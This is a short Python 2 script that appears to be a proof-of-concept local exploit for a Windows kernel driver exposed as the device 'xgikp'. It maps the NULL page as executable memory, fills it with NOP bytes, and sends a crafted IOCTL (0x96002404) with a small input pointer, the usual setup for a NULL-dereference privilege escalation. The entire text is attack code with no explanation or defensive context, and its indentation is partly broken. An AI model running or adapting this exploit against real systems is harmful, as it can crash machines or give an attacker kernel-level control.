from sys import exit
     from ctypes import *
     NtAllocateVirtualMemory = windll.ntdll.NtAllocateVirtualMemory
     WriteProcessMemory = windll.kernel32.WriteProcessMemory
     DeviceIoControl = windll.ntdll.NtDeviceIoControlFile
     CreateFileA = windll.kernel32.CreateFileA
     CloseHandle = windll.kernel32.CloseHandle
     FILE_SHARE_READ,FILE_SHARE_WRITE = 0,1
     OPEN_EXISTING = 3
     NULL = None

     device = "xgikp"
     code = 0x96002404
     inlen = 0xe6b6
     outlen = 0x0
     inbuf = 0x1
     outbuf = 0xffff0000
     inBufMem = "\x90"*inlen

     def main():
        try:
                handle = CreateFileA("\\\\.\\%s" %
(device),FILE_SHARE_WRITE|FILE_SHARE_READ,0,None,OPEN_EXISTING,0,None)
                if (handle == -1):
                        print "[-] error creating handle"
                        exit(1)
        except Exception as e:
                print "[-] error creating handle"
                exit(1)

NtAllocateVirtualMemory(-1,byref(c_int(0x1)),0x0,byref(c_int(0xffff)),0x1000|0x2000,0x40)
        WriteProcessMemory(-1,0x1,inBufMem,inlen,byref(c_int(0)))

DeviceIoControl(handle,NULL,NULL,NULL,byref(c_ulong(8)),code,0x1,inlen,outbuf,outlen)
        CloseHandle(handle)
        return False

     if __name__=="__main__":
        main()
